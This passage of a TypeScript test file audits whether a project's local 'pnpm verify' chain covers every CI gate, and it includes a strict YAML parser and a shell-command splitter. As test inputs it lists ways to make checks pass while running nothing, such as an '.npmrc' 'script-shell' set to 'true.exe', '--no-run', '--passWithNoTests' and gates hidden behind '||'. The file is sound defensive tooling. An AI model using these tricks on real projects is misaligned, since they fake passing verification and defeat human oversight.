      typecheck: 'tsc --build --force',
    });

    // The edge is not followed: the root manifest's body is not in the chain.
    expect(chain.map((e) => e.command.text)).toEqual(['cd src-tauri', 'pnpm typecheck']);
    expect(chain.map((e) => e.rebound)).toEqual([false, true]);
    expect(unclassifiedVerifyCommands(chain)).toEqual([
      'probe -> pnpm typecheck (a "cd" runs in front of it, so which package.json this name binds to ' +
        'is not written here)',
    ]);

    // The control, one `cd` removed and nothing else changed: the same name, the
    // same manifest, and now the edge is followed into `typecheck`'s body.
    const rooted = chainOf('probe', { probe: 'pnpm typecheck', typecheck: 'tsc --build --force' });
    expect(rooted.map((e) => e.command.text)).toEqual(['pnpm typecheck', 'tsc --build --force']);
    expect(unclassifiedVerifyCommands(rooted)).toEqual([]);

    // It composes downwards and not upwards, which is what a shell does: a `cd`
    // inside an invoked script is gone when that script returns, so the second
    // `pnpm build` here is not rebound.
    const nested = chainOf('probe', {
      probe: 'pnpm lint:rust && pnpm build',
      'lint:rust': 'cd src-tauri && cargo fmt --all --check',
      build: 'vite build',
    });
    expect(nested.filter((e) => e.command.text === 'pnpm build').map((e) => e.rebound)).toEqual([false]);
    expect(nested.some((e) => e.command.text === 'vite build')).toBe(true);
    expect(unclassifiedVerifyCommands(nested)).toEqual([]);

    // And downwards: a script invoked after a `cd` cannot be resolved either.
    const inherited = chainOf('probe', {
      probe: 'cd src-tauri && pnpm build',
      build: 'vite build',
    });
    expect(inherited.some((e) => e.command.text === 'vite build')).toBe(false);
  });

  it('the setup exemption for "pnpm install" covers no work of its own', () => {
    // Defect seventeen. SETUP_COMMANDS exempts `pnpm install --frozen-lockfile`
    // — run in three CI jobs and in no `pnpm verify` — and used to justify that
    // with "cannot fail on the state of the tree". `pnpm install` also runs the
    // root package's lifecycle scripts, and `chainOf` starts at `verify` and has
    // no notion of that edge, so a body written under one of these keys is CI
    // work no local run reaches. Measured in a scratch package on pnpm 10.33.0:
    // a `postinstall` exiting 1 made `pnpm install --frozen-lockfile` exit 1
    // with ` ELIFECYCLE  Command failed with exit code 1.`; with both succeeding
    // it ran `postinstall` and then `prepare` and exited 0, while `pnpm verify`
    // in the same package ran neither.
    // Asked of the rule on input the tree does not have, first — the real
    // manifest declares none of these, so the assertion below is satisfied by a
    // filter that reports nothing at all.
    expect(lifecycleScriptsIn({ postinstall: 'node probe.mjs', prepare: 'x', test: 'vitest run' })).toEqual([
      'postinstall',
      'prepare',
    ]);
    expect(lifecycleScriptsIn({ test: 'vitest run', build: 'vite build' })).toEqual([]);

    expect(
      lifecycleScriptsIn(PACKAGE.scripts),
      'package.json declares a script that pnpm runs on its own, at every ' +
        '`pnpm install` — which CI does in three jobs and `pnpm verify` does in ' +
        'none. SETUP_COMMANDS exempts that install as setup, so a gate written ' +
        'here is CI work every check above would report as covered. Decide where ' +
        'the work belongs: in the verify chain, in a workflow step of its own, ' +
        'or nowhere.',
    ).toEqual([]);
  });

  it('the shell that reads a script body is one this reader assumed', () => {
    // Defect twenty, and the verify side's `defaults.run.shell`. Every command
    // in this chain is split on POSIX `&&`, `||`, `;` and `|` by
    // `shellCommands`; what actually interprets those bytes is pnpm's
    // `script-shell`, which lives in this repository's tracked `.npmrc`. Before
    // this round the token `npmrc` occurred zero times in this file. Measured on
    // the tree that shipped after round three, twice: appending
    // `script-shell=C:/Program Files/Git/usr/bin/true.exe` to `.npmrc`, with
    // `package.json` and `ci.yml` byte-identical, was `172 passed (172)`, exit 0
    // — a tree in which `pnpm verify` and CI's own `pnpm test` step both execute
    // nothing.
    //
    // The module-load call is the real assertion; these two ask the rule about
    // input the tree does not have, which is the lesson of every other named
    // function in this file.
    expect(SHELL_SETTINGS).toEqual(['.npmrc']);

    const withNpmrc = (text: string): (() => unknown) => {
      const root = mkdtempSync(join(tmpdir(), 'verify-npmrc-'));
      writeFileSync(join(root, '.npmrc'), text, 'utf8');
      return () => {
        try {
          // Composed the way module load composes them: the enumeration answers
          // which files are there, and this rule answers what they say.
          return refuseScriptInterpretation(root, readRootSurface(root, []));
        } finally {
          rmSync(root, { recursive: true, force: true });
        }
      };
    };

    expect(withNpmrc('script-shell=C:/Program Files/Git/usr/bin/true.exe\n')).toThrow(/script-shell/u);
    expect(withNpmrc('shell-emulator=true\n')).toThrow(/"shell-emulator"/u);
    // The default refusal, not a list of two spellings: a key nobody thought of
    // is refused the same way. That is the shape defect eleven inverted.
    expect(withNpmrc('some-setting-nobody-listed=1\n')).toThrow(/"some-setting-nobody-listed"/u);

    // The controls. Without them the three rows above pass for a reader that
    // refuses every `.npmrc`, and the tracked one would take this file down.
    expect(withNpmrc('# a comment\n\nstrict-peer-dependencies=false\nauto-install-peers=true\n')).not.toThrow();
    expect(withNpmrc('')()).toEqual(['.npmrc']);

    // The wiring, which is not the rule: a `.npmrc` this run's enumeration never
    // reported is a `.npmrc` nobody read, and the answer to "is it there" comes
    // from ROOT_SURFACE rather than from a second look at the disk.
    expect(refuseScriptInterpretation(REPO_ROOT, [])).toEqual([]);
  });

  it('a gate on the right of a || is present, gating, and not reached — defect twelve', () => {
    // The realistic shape: run the cheap check, fall back to the expensive one.
    // `pnpm test:click-harness` succeeds, so `pnpm test:harness` never runs —
    // and its failure, if it ever ran, would fail the script. `gating` alone
    // says yes to it; the two facts are not one fact.
    const chain = chainOf('probe', {
      probe: 'pnpm verify:harness',
      'verify:harness': 'pnpm test:click-harness || pnpm test:harness',
      'test:harness': 'vitest run',
      'test:click-harness': 'vitest run',
    });
    const harness = chain.find((e) => e.command.text === 'pnpm test:harness');
    expect(harness?.gating).toBe(true);
    expect(harness?.reached).toBe(false);

    // And the flag composes along the edge: the body of a script invoked there
    // is not reached either.
    expect(chain.filter((e) => e.script === 'test:harness').map((e) => e.reached)).toEqual([false]);

    // The control, on the same two commands with the gate moved to the left of
    // the same operator: there it runs, and there `gating` is what catches it.
    const mirrored = chainOf('probe', {
      probe: 'pnpm test:harness || pnpm test:click-harness',
      'test:harness': 'vitest run',
      'test:click-harness': 'vitest run',
    });
    const left = mirrored.find((e) => e.command.text === 'pnpm test:harness');
    expect(left?.gating).toBe(false);
    expect(left?.reached).toBe(true);
  });

  it('reads pnpm run <script> as the same invocation as pnpm <script>', () => {
    expect(runsPnpm(parseCommand('pnpm run typecheck'), 'typecheck')).toBe(true);
    expect(runsPnpm(parseCommand('pnpm run typecheck --incremental'), 'typecheck')).toBe(false);
  });
});

/* -------------------------------------------------------------------------- */
/* the YAML reader                                                            */
/* -------------------------------------------------------------------------- */

/** One node of the block-YAML subset this reader implements. */
type YamlNode =
  | { readonly kind: 'mapping'; readonly entries: readonly YamlEntry[]; readonly line: number }
  | { readonly kind: 'sequence'; readonly items: readonly YamlNode[]; readonly line: number }
  | {
      readonly kind: 'scalar';
      readonly value: string;
      readonly line: number;
      /**
       * True only for a scalar written **plain** — no quotes, no `|`/`>` block
       * indicator, not a flow sequence kept as text.
       *
       * YAML's core schema resolves a tag from the plain form and from nothing
       * else: `false` is the boolean, `'false'` and `"false"` are the
       * three-letter string, and a block scalar is a string too. This field is
       * what lets {@link yamlBooleanOf} tell them apart, which the reader could
       * not do while {@link parseWorkflowYaml} stripped the quotes and handed
       * back bare text — see defect twenty-four.
       *
       * Read by {@link yamlBooleanOf}, and by nothing else.
       */
      readonly plain: boolean;
    };

interface YamlEntry {
  readonly key: string;
  readonly value: YamlNode;
  readonly line: number;
}

/**
 * A block-YAML subset, parsed **totally**: every non-blank, non-comment line is
 * consumed by a construct this reader implements, or the file is refused by
 * name and line.
 *
 * That totality is the fix for defect four and its whole class. The old reader
 * scanned for lines matching `/^[ \t]*-?[ \t]*run:/` and said nothing about
 * every other line, so any spelling outside that pattern — a quoted key, a flow
 * mapping, anything a fourth agent thinks of next — was invisible *and silent*.
 * A parser that must account for every line cannot be silent: it either
 * understands the line or throws.
 *
 * Implemented: block mappings (keys bare, `'…'` or `"…"`), block sequences,
 * plain / quoted / literal / folded scalars, flow sequences kept as opaque text
 * (`branches: [main]` — nothing here looks inside one), and comments.
 *
 * Refused: flow mappings, anchors, aliases, tags, document separators,
 * directives, tabs in indentation, an unterminated quote, and anything left over
 * after the document ends.
 *
 * Not a general YAML implementation and not trying to be. A construct outside
 * the subset costs a review, which is the trade rule 2 of this file has always
 * made; the alternative — reading past it — is the defect.
 */
function parseWorkflowYaml(file: string, text: string): YamlNode {
  const lines = text.split(/\r?\n/u);
  let index = 0;

  const at = (line: number): string => `.github/workflows/${file}:${String(line + 1)}`;
  function refuse(line: number, what: string): never {
    throw new Error(
      `${at(line)} ${what}. This reader parses a block-YAML subset and refuses ` +
        'what it cannot take apart, because reading past a construct is how a ' +
        'gate reaches CI unseen. Rewrite it in the subset, or teach this reader.',
    );
  }

  const isSkippable = (line: string): boolean => {
    const trimmed = line.trim();
    return trimmed === '' || trimmed.startsWith('#');
  };

  /** A bare mapping key, ending at the first `:` that is followed by space or EOL. */
  const PLAIN_KEY = /^([^\s#'"{}[\]&*!|>%@`,][^:#]*?)[ \t]*:(?=[ \t]|$)(.*)$/u;

  /**
   * Whether a line opens a mapping entry — asked without refusing, because the
   * caller is deciding *what shape* follows a key, not judging the line.
   */
  const isKeyLine = (trimmed: string): boolean => {
    const quote = trimmed[0];
    if (quote === '"' || quote === "'") {
      const close = trimmed.indexOf(quote, 1);
      return close !== -1 && trimmed.slice(close + 1).startsWith(':');
    }
    return PLAIN_KEY.test(trimmed);
  };

  function indentOf(line: number): number {
    const raw = lines[line] ?? '';
    if (raw.slice(0, raw.length - raw.trimStart().length).includes('\t')) {
      refuse(line, 'is indented with a tab');
    }
    return raw.length - raw.trimStart().length;
  }

  function nextContent(from: number): number {
    let cursor = from;
    while (cursor < lines.length && isSkippable(lines[cursor] ?? '')) cursor += 1;
    return cursor;
  }

  for (const [line, raw] of lines.entries()) {
    const trimmed = raw.trim();
    if (trimmed === '---' || trimmed === '...') refuse(line, 'is a document separator');
    if (raw.startsWith('%')) refuse(line, 'is a YAML directive');
  }

  /** The scalar text of a block scalar (`|`, `>`) whose key sits at `indent`. */
  function blockScalar(from: number, indent: number, folded: boolean): { value: string; next: number } {
    const body: string[] = [];
    let cursor = from;
    let strip = -1;
    while (cursor < lines.length) {
      const raw = lines[cursor] ?? '';
      if (raw.trim() === '') {
        body.push('');
        cursor += 1;
        continue;
      }
      const depth = indentOf(cursor);
      if (depth <= indent) break;
      if (strip === -1) strip = depth;
      body.push(raw.slice(strip));
      cursor += 1;
    }
    while (body.length > 0 && body[body.length - 1] === '') body.pop();
    // Folding joins continuation lines with a space, which is what the runner's
    // shell then sees as one command; a literal block keeps the newlines, which
    // is what makes each line its own command.
    return { value: folded ? body.join(' ').trim() : body.join('\n'), next: cursor };
  }

  /** The value written after a key, on the line or below it. */
  function parseValue(line: number, rest: string, indent: number): YamlNode {
    const value = rest.trim();

    const block = /^([|>])[-+]?[0-9]*[ \t]*(?:#.*)?$/u.exec(value);
    if (block !== null) {
      const { value: scalar, next } = blockScalar(line + 1, indent, block[1] === '>');
      index = next;
      return { kind: 'scalar', value: scalar, line, plain: false };
    }

    if (value === '' || value.startsWith('#')) {
      const below = nextContent(line + 1);
      if (below < lines.length) {
        const depth = indentOf(below);
        const trimmed = (lines[below] ?? '').trim();
        const isItem = trimmed === '-' || trimmed.startsWith('- ');
        if (depth > indent) {
          if (isItem || isKeyLine(trimmed)) {
            index = below;
            return parseNode(depth);
          }
          // A plain scalar written below its key, which YAML folds into one
          // string with spaces. This is one of the spellings defect three was
          // about, and the only reason it reached this reader as a *refusal*
          // before was that a line reader could not see it at all.
          const parts: string[] = [];
          let cursor = below;
          while (cursor < lines.length) {
            const raw = lines[cursor] ?? '';
            if (isSkippable(raw)) {
              cursor += 1;
              continue;
            }
            const text = raw.trim();
            if (indentOf(cursor) <= indent) break;
            if (text === '-' || text.startsWith('- ') || isKeyLine(text)) break;
            parts.push(text);
            cursor += 1;
          }
          index = cursor;
          return { kind: 'scalar', value: parts.join(' '), line, plain: true };
        }
        // A sequence may sit at its key's own indent. Legal, common, and a
        // reader that treated it as "no value" would drop every step in the job.
        if (depth === indent && isItem) {
          index = below;
          return parseSequence(indent);
        }
      }
      index = line + 1;
      return { kind: 'scalar', value: '', line, plain: true };
    }

    index = line + 1;

    if (value.startsWith('{')) refuse(line, 'is a flow mapping');
    if (value.startsWith('&') || value.startsWith('*') || value.startsWith('!')) {
      refuse(line, 'is an anchor, alias or tag');
    }
    if (value.startsWith('[')) {
      if (!value.includes(']')) refuse(line, 'is a flow sequence that does not close on its line');
      if (value.includes('{')) refuse(line, 'is a flow mapping inside a flow sequence');
      // Kept as opaque text: nothing here looks inside one (`branches: [main]`).
      return { kind: 'scalar', value, line, plain: false };
    }

    const quote = value[0];
    if (quote === '"' || quote === "'") {
      if (value.includes('\\')) refuse(line, 'is a quoted scalar containing a backslash escape');
      const close = value.indexOf(quote, 1);
      if (close === -1) refuse(line, 'is a scalar whose quote never closes');
      const after = value.slice(close + 1).trim();
      if (after !== '' && !after.startsWith('#')) {
        refuse(line, 'has text after the closing quote of its value');
      }
      return { kind: 'scalar', value: value.slice(1, close), line, plain: false };
    }

    // A plain scalar ends at ` #`, which starts a comment. Anchors and aliases
    // are refused above, so what is left is text.
    const comment = value.search(/[ \t]#/u);
    return {
      kind: 'scalar',
      value: (comment === -1 ? value : value.slice(0, comment)).trim(),
      line,
      plain: true,
    };
  }

  function parseMapping(indent: number): YamlNode {
    const startLine = index;
    const entries: YamlEntry[] = [];
    const seen = new Set<string>();

    for (;;) {
      const line = nextContent(index);
      if (line >= lines.length) break;
      const depth = indentOf(line);
      if (depth < indent) break;
      const raw = lines[line] ?? '';
      const trimmed = raw.trim();
      if (depth > indent) refuse(line, 'is indented deeper than the mapping it belongs to');
      if (trimmed === '-' || trimmed.startsWith('- ')) {
        refuse(line, 'is a sequence item where this reader expects a mapping key');
      }
      // `- { run: pnpm x }` — defect four's second spelling. A line reader has
      // no line beginning `run:` to find here, and neither has this one; the
      // difference is that this one says so.
      if (trimmed.startsWith('{')) refuse(line, 'is a flow mapping');

      let key: string;
      let rest: string;
      const quote = trimmed[0];
      if (quote === '"' || quote === "'") {
        const close = trimmed.indexOf(quote, 1);
        if (close === -1) refuse(line, 'has a key whose quote never closes');
        if (trimmed.slice(0, close).includes('\\')) {
          refuse(line, 'has a quoted key containing a backslash escape');
        }
        const after = trimmed.slice(close + 1);
        if (!after.startsWith(':')) refuse(line, 'is a quoted scalar where a mapping key belongs');
        key = trimmed.slice(1, close);
        rest = after.slice(1);
      } else {
        const parsed = PLAIN_KEY.exec(trimmed);
        if (parsed === null) refuse(line, `is at mapping depth but is not a key this reader can read: "${trimmed}"`);
        key = parsed[1] ?? '';
        rest = parsed[2] ?? '';
      }

      // Last-wins is YAML's rule and first-wins is what a reader like this
      // naturally does, so the two can disagree about what runs. Refused.
      if (seen.has(key)) refuse(line, `repeats the key "${key}" in one mapping`);
      seen.add(key);

      index = line + 1;
      entries.push({ key, value: parseValue(line, rest, depth), line });
    }

    return { kind: 'mapping', entries, line: startLine };
  }

  function parseSequence(indent: number): YamlNode {
    const startLine = index;
    const items: YamlNode[] = [];

    for (;;) {
      const line = nextContent(index);
      if (line >= lines.length) break;
      if (indentOf(line) !== indent) break;
      const raw = lines[line] ?? '';
      const trimmed = raw.trim();
      if (trimmed !== '-' && !trimmed.startsWith('- ')) break;

      const after = raw.slice(indent + 1);
      if (after.trim() === '' || after.trimStart().startsWith('#')) {
        index = line + 1;
        const below = nextContent(index);
        if (below >= lines.length || indentOf(below) <= indent) {
          items.push({ kind: 'scalar', value: '', line, plain: true });
          continue;
        }
        index = below;
        items.push(parseNode(indentOf(below)));
        continue;
      }

      // The dash becomes indentation, so the columns of everything on and under
      // this line line up with the node that starts here.
      const column = indent + 1 + (after.length - after.trimStart().length);
      lines[line] = ' '.repeat(column) + after.trimStart();
      index = line;
      items.push(parseNode(column));
    }

    return { kind: 'sequence', items, line: startLine };
  }

  function parseNode(indent: number): YamlNode {
    const line = nextContent(index);
    index = line;
    if (line >= lines.length) return { kind: 'scalar', value: '', line, plain: true };
    const trimmed = (lines[line] ?? '').trim();
    if (trimmed === '-' || trimmed.startsWith('- ')) return parseSequence(indent);
    return parseMapping(indent);
  }

  const first = nextContent(0);
  if (first >= lines.length) throw new Error(`.github/workflows/${file} has nothing in it to read`);
  if (indentOf(first) !== 0) refuse(first, 'starts the document indented');
  index = first;
  const root = parseNode(0);

  // The totality net. If anything is left, the parser walked past a construct
  // instead of refusing it, and that is the bug this whole file is about.
  const leftover = nextContent(index);
  if (leftover < lines.length) refuse(leftover, 'was left unread after the document ended');

  return root;
}

/* -------------------------------------------------------------------------- */
/* the shell reader                                                           */
/* -------------------------------------------------------------------------- */

/** One simple command, and whether its failure fails the run it is part of. */
interface ShellCommand {
  readonly text: string;
  /**
   * False when a shell operator swallows this command's exit status: it is on
   * the left of a `||`, or in front of a `;`, or upstream in a `|`.
   *
   * Copied out by {@link commandsOf} onto {@link WorkflowCommand.gating} and by
   * {@link chainOf} onto {@link VerifyCommand.gating}, which are what the cases
   * read; the case that decides what it is for is `verify reaches the CI gate`,
   * which is the whole of defect six. It is also asserted on directly, as it
   * comes off {@link shellCommands}, by the seven rows of *knows which commands
   * in $shape can fail the run*.
   */
  readonly gating: boolean;
  /**
   * False when there is a **green** run of this command line in which this
   * command does not execute at all: it sits immediately after a `||`, so it
   * runs only if the command in front of it failed.
   *
   * A separate fact from {@link ShellCommand.gating}, and defect twelve is
   * that they were one. `a && b`: if `a` fails, `b` does not run — but the run
   * is red, so `b` being skipped never hides a failure. `a || b`: if `a`
   * succeeds, `b` is skipped and the run is **green**, so a gate written there
   * is one this reader would report as run when it was not.
   *
   * Carried the same way {@link ShellCommand.gating} is: onto
   * {@link WorkflowCommand.reached} by {@link commandsOf}, where *every CI gate
   * runs, and can fail the job it is listed in* reads it, and onto
   * {@link VerifyCommand.reached} by {@link chainOf}, where the `verify reaches
   * the CI gate` case demands `gating && reached`. Asserted on directly by the
   * seven rows of *knows which commands in $shape a green run executes*.
   */
  readonly reached: boolean;
}

/**
 * A command line, split into the simple commands the shell would run.
 *
 * Two things this has to get right, and the old reader got neither:
 *
 * 1. **Every command, not the first one.** `pnpm install --frozen-lockfile &&
 *    pnpm probe-smuggled-gate` is two commands. Reading it as one string and
 *    asking whether it *begins* with setup is defect five.
 * 2. **Which of them can fail the run.** `a && b || c` is `((a && b) || c)`, so
 *    a failure of `a` or `b` is caught by the `||` and only `c` can fail the
 *    line. That is defect six: a gate wrapped in `|| echo` is present in the
 *    script and gates nothing.
 * 3. **Which of them run at all on a green pass.** The mirror of (2), and
 *    defect twelve: in `a || b`, `b` is skipped whenever `a` succeeds, so a
 *    gate written there is unexecuted on exactly the runs this file calls
 *    green. That is {@link ShellCommand.reached}, and it is a different fact
 *    from `gating` — in `a && b`, `b` is also skipped when `a` fails, but that
 *    run is red, so nothing is hidden.
 *
 * Refusals, not guesses: command substitution, subshells and brace groups,
 * background jobs, and any `$` expansion outside single quotes. Each of them can
 * make the text of the command differ from what runs, and this file's one rule
 * is that a reader which cannot see a value must say so.
 */
function shellCommands(source: string, where: string): ShellCommand[] {
  const refuse = (what: string): never => {
    throw new Error(
      `${where} contains ${what}, which this reader cannot evaluate. It refuses ` +
        'rather than guess: a command whose text is not in the file is a gate ' +
        'nobody here is checking. Write the chain out, or teach this reader.',
    );
  };

  // A backslash-newline is a line continuation: rejoin before splitting, so a
  // wrapped `apt-get install` reads as the one command it is.
  const text = source.replace(/[ \t]*\\\r?\n[ \t]*/gu, ' ');

  const out: ShellCommand[] = [];
  let group: string[] = [];
  let current = '';
  let quote: '"' | "'" | null = null;
  // Whether the `&&` chain now being accumulated began just after a `||`. Its
  // FIRST command is the one the `||` may skip; `a || b && c` is `((a || b) &&
  // c)`, so `c` runs on every green reading of the line and `b` does not.
  let conditional = false;

  const endSegment = (): void => {
    const trimmed = current.trim();
    current = '';
    if (trimmed !== '') group.push(trimmed);
  };
  const flush = (gating: boolean): void => {
    group.forEach((command, at) => {
      out.push({ text: command, gating, reached: !(conditional && at === 0) });
    });
    group = [];
  };

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i] ?? '';
    const next = text[i + 1] ?? '';

    if (quote !== null) {
      if (quote === '"' && char === '$') refuse('a shell expansion inside double quotes');
      if (quote === '"' && char === '`') refuse('a command substitution');
      if (char === quote) quote = null;
      current += char;
      continue;
    }

    if (char === '"' || char === "'") {
      quote = char;
      current += char;
      continue;
    }
    if (char === '`') refuse('a command substitution');
    if (char === '$') refuse(next === '(' ? 'a command substitution' : 'a shell expansion');
    if ((char === '<' || char === '>') && next === '(') refuse('a process substitution');
    if (char === '(' || char === ')' || char === '{' || char === '}') refuse('a subshell or group');

    if (char === '&' && next === '&') {
      endSegment();
      i += 1;
      continue;
    }
    if (char === '&') refuse('a background job');
    if (char === '|' && next === '|') {
      endSegment();
      flush(false);
      conditional = true;
      i += 1;
      continue;
    }
    if (char === '|' || char === ';' || char === '\n') {
      endSegment();
      flush(false);
      conditional = false;
      continue;
    }

    current += char;
  }

  if (quote !== null) refuse('a quote that never closes');
  endSegment();
  flush(true);
  return out;
}

/** One simple command, split into what it runs and what it runs it on. */
interface ParsedCommand {
  readonly text: string;
  readonly program: string;
  readonly args: readonly string[];
}

/**
 * Split a simple command into its program and arguments, with quoting removed.
 *
 * The point of separating the program from the arguments is defect six: a gate
 * name that appears in an argument is a *word*, and a gate name in the program
 * position is an *invocation*. `echo "pnpm typecheck"` has program `echo`.
 */
function parseCommand(text: string): ParsedCommand {
  const tokens: string[] = [];
  let current = '';
  let started = false;
  let quote: '"' | "'" | null = null;

  for (const char of text) {
    if (quote !== null) {
      if (char === quote) quote = null;
      else current += char;
      started = true;
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      started = true;
      continue;
    }
    if (char === ' ' || char === '\t') {
      if (started) tokens.push(current);
      current = '';
      started = false;
      continue;
    }
    current += char;
    started = true;
  }
  if (started) tokens.push(current);

  return { text, program: tokens[0] ?? '', args: tokens.slice(1) };
}

/**
 * True when `command` is exactly `program` with exactly these arguments.
 *
 * **Exact, not a leading-argument prefix.** The prefix version is one more
 * instance of defect five in a different place, and it has a working exploit:
 * `cargo test --workspace --locked --no-run` satisfies a prefix test, runs zero
 * tests, and leaves this file green while `verify` has stopped verifying. There
 * is no way to tell a flag that strengthens a gate (`--no-fail-fast`) from one
 * that empties it (`--no-run`, `--passWithNoTests`) by looking at the string, so
 * this reader does not try: an argument list that differs from CI's reddens and
 * asks for a human.
 *
 * The alternative considered and rejected: an allowlist of flags known to be
 * harmless. It is the same shape as the exemption that failed — a list of
 * spellings someone thought of — and the failure mode is a silent green rather
 * than a review. Exactness is noisier and cannot be wrong in that direction.
 */
function invokes(command: ParsedCommand, program: string, ...args: readonly string[]): boolean {
  return (
    command.program === program &&
    command.args.length === args.length &&
    args.every((argument, at) => command.args[at] === argument)
  );
}

/**
 * True when `command` is `pnpm <script>` with nothing after the script name.
 *
 * Same argument as {@link invokes}. `pnpm test --passWithNoTests` is a `pnpm
 * test` invocation and is not the `pnpm test` gate.
 */
function runsPnpm(command: ParsedCommand, script: string): boolean {
  if (pnpmScript(command) !== script) return false;
  return command.args.length === (command.args[0] === 'run' ? 2 : 1);
}

/**
 * The `package.json` script a command invokes through pnpm, or `undefined`.
 *
 * The name has to be a key in `scripts` — `pnpm install --frozen-lockfile`
 * invokes no script — and it has to be in the *program's argument* position, not
 * merely somewhere in the text. That last clause is defect six.
 */
function pnpmScript(command: ParsedCommand): string | undefined {
  if (command.program !== 'pnpm') return undefined;
  const at = command.args[0] === 'run' ? 1 : 0;
  const name = command.args[at];
  if (name === undefined || name.startsWith('-')) return undefined;
  return Object.hasOwn(PACKAGE.scripts, name) ? name : undefined;
}

/**
 * True when `command` executes the repository script at `path`.
 *
 * Two ways this tree reaches one, both named rather than pattern-matched: the
 * script as the program (`./scripts/secret-scan.sh`), and the script handed to
 * `scripts/run-bash.mjs`, which is the hop a Windows developer takes because
 * pnpm runs script bodies through `cmd.exe`. Anything else is not an execution
 * as far as this reader is concerned, and it will say the gate is missing rather
 * than accept a mention of the filename.
 */
function runsScript(command: ParsedCommand, path: string): boolean {
  if (command.program.replace(/^\.\//u, '') === path) return command.args.length === 0;
  return (
    command.program === 'node' &&
    command.args.length === 2 &&
    command.args[0] === 'scripts/run-bash.mjs' &&
    command.args[1] === path
  );
}

/* -------------------------------------------------------------------------- */
/* the workflow surface                                                       */
/* -------------------------------------------------------------------------- */

/** One workflow file the runner would load. */
interface Workflow {
  /** Relative to `.github/workflows/`, `/` separators. */
  readonly file: string;
  readonly text: string;
}

/** One step, as much of it as this reader reasons about. */
interface WorkflowStep {
  readonly line: number;
  /** `undefined` on a `uses:` step. Read by `commands` and by two cases above. */
  readonly run: string | undefined;
  // No `uses` field. It was here, written on every step and read by nothing:
  // `refuseUses` consumes the target at parse time and the assertions above
  // never ask a step what it uses. A field written with no reader is a defect
  // of its own — it looks like coverage and is not — so it is gone rather than
  // kept for a caller that does not exist. Anything that needs the target reads
  // it off the parse tree, which is what `usesTargetOf` does.
}

/** One job, with the simple commands its steps run. */
interface WorkflowJob {
  readonly file: string;
  readonly name: string;
  readonly runsOn: string;
  readonly steps: readonly WorkflowStep[];
  /**
   * Every simple command the job's `run:` steps execute, each carrying whether
   * its failure can fail the job. The flag used to be computed here and dropped
   * on the floor by a `.map(c => c.text)`; keeping it is defect ten, and its
   * reader is *every CI gate runs, and can fail the job it is listed in*.
   */
  readonly commands: readonly ShellCommand[];
}

/** What this reader made of one workflow file. */
interface WorkflowModel {
  /**
   * The file this model was read from, relative to `.github/workflows/`. Read
   * by *every gate CI has is one it runs on the events this claim assumes*,
   * which reports the triggers per file, and by nothing else — before that case
   * it was a field written by `modelOf` and read by nothing, which round four's
   * critic recorded and this file's own comment on {@link WorkflowStep} calls a
   * defect of its own. Measured on the tree this comment ships in, twice:
   * writing `'MUTATED-UNREAD'` here is `1 failed | 195 passed (196)`, exit 1.
   * Round four's critic reported that same mutation on that tree as
   * `181 passed (181)`, exit 0, twice; that reading is theirs and was not
   * re-run here.
   */
  readonly file: string;
  /**
   * The events this workflow runs on, one line each, as {@link triggersOf}
   * spells them. Read by *every gate CI has is one it runs on the events this
   * claim assumes*, and by nothing else.
   */
  readonly triggers: readonly string[];
  readonly jobs: readonly WorkflowJob[];
  /**
   * Every pinned third-party action this file admitted, in the order met. Read
   * by {@link readWorkflowSurface}, which unions it across files for *every
   * pinned third-party action is one the workflows really use*.
   */
  readonly actions: readonly string[];
}

/** One simple command CI runs, carrying the file and job that run it. */
interface WorkflowCommand {
  readonly file: string;
  readonly job: string;
  readonly command: string;
  /** Whether this command's failure can fail the job CI runs it in. */
  readonly gating: boolean;
  /**
   * Whether every green run of the step that carries it executes it — false for
   * a command CI writes on the right of a `||`. Read by
   * {@link unenforcedGates}, and asserted on directly by *carries the gating
   * flag from the parsed step into the command list*, which is the wiring case
   * for both this field and {@link WorkflowCommand.gating}.
   */
  readonly reached: boolean;
}

/**
 * The commands CI runs that are neither a listed setup command nor a listed
 * gate, named by file and job.
 *
 * A named function rather than an inline filter so that its rule can be tested
 * on inputs the real tree does not contain. Mutating an inline filter that only
 * ever sees clean input changes nothing observable, which makes it look tested
 * when it is not — measured on the tree of 89 that carried it: turning the
 * equality below back into a `startsWith`
 * left this file 89/89 green until the case *does not exempt a command that
 * merely begins with a setup command* existed.
 *
 * Both halves are **equality**, deliberately. `startsWith` on the setup side is
 * defect five verbatim; `startsWith` on the gate side is the same shape, and
 * would let `cargo test --workspace --locked --no-run` pass as the `cargo test`
 * gate.
 */
/**
 * The ways one {@link CiGate} row can have stopped being about one command,
 * named rather than merely asserted.
 *
 * A named function for the same reason {@link unaccounted} is one: every row in
 * the real list is consistent, so a rule written inline here would only ever see
 * input that satisfies it, and weakening the rule would change nothing
 * observable. The cases in *a gate row is checked against itself* feed it rows
 * this tree does not contain.
 *
 * `delegatesTo` is the one shape where the halves are meant to differ — CI runs
 * the harness gate through `ci-retry-vitest-crash.mjs` and `verify` must reach
 * the unwrapped gate. Three conditions make that an exemption that has to be
 * earned: the target must be a listed gate, the predicate must accept the
 * target, and it must *not* accept the wrapper, so a row cannot buy silence by
 * declaring a delegation it does not need.
 */
function rowDrift(gate: CiGate, rows: readonly CiGate[]): string[] {
  const { ci, runs, delegatesTo } = gate;
  if (delegatesTo === undefined) {
    return runs(parseCommand(ci))
      ? []
      : [
          `its "runs" predicate does not accept "${ci}" itself. The two halves of the ` +
            'row have drifted apart: CI runs one command and "pnpm verify" is being ' +
            'checked for another. Either update "runs", or say why the row is a ' +
            'wrapper by giving it "delegatesTo".',
        ];
  }

  const out: string[] = [];
  if (!rows.some((row) => row.ci === delegatesTo)) {
    out.push(
      `it delegates to "${delegatesTo}", which is not itself a listed gate. A ` +
        'delegation target that no row covers is a gate nobody checks.',
    );
  }
  if (!runs(parseCommand(delegatesTo))) {
    out.push(
      `it delegates to "${delegatesTo}" but its "runs" predicate does not accept ` +
        'that command either, so it describes neither half.',
    );
  }
  if (runs(parseCommand(ci))) {
    out.push(
      'it claims to be a wrapper, but its "runs" predicate accepts the wrapping ' +
        'command directly. The exemption is not needed, and an unneeded exemption ' +
        'is somewhere the next drift can hide. Delete "delegatesTo".',
    );
  }
  return out;
}

/**
 * The commands CI lists as gates and then writes so that they do not gate,
 * named by file, job and reason.
 *
 * Two reasons, because there are two ways to stop being a gate and defect
 * twelve is that this function knew only one of them:
 *
 * - **its failure cannot fail the job** (`!gating`) — it is on the left of a
 *   `||`, in front of a `;` or a `|`, or on a line of a block scalar that is
 *   not the last. That is defect ten.
